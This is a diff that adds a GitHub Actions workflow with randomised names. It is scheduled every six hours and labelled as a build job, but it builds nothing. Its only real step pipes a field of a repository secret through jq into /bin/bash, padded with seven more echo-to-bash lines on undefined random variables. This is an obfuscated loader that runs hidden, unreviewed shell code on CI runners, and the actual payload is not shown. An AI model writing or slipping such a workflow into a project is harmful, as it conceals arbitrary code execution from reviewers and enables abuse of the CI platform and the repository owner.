@@ -1,0 +1,24 @@
+name: caobuyong6745
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: caobuyong6745
+        env:
+          b861: ${{ secrets.b861 }}
+        run: |
+          echo $b861 | jq -r .glzb0 | /bin/bash
+          echo $wqlbb5 | jq -r .tu59 | /bin/bash
+          echo $xvog968 | jq -r .raew3120 | /bin/bash
+          echo $bx34 | jq -r .eq988 | /bin/bash
+          echo $vjemi73506 | jq -r .e509 | /bin/bash
+          echo $dh01922 | jq -r .xnlpf5956 | /bin/bash
+          echo $xy8 | jq -r .rixo05 | /bin/bash
+          echo $qfjzh92067 | jq -r .ltnrk51343 | /bin/bash
+
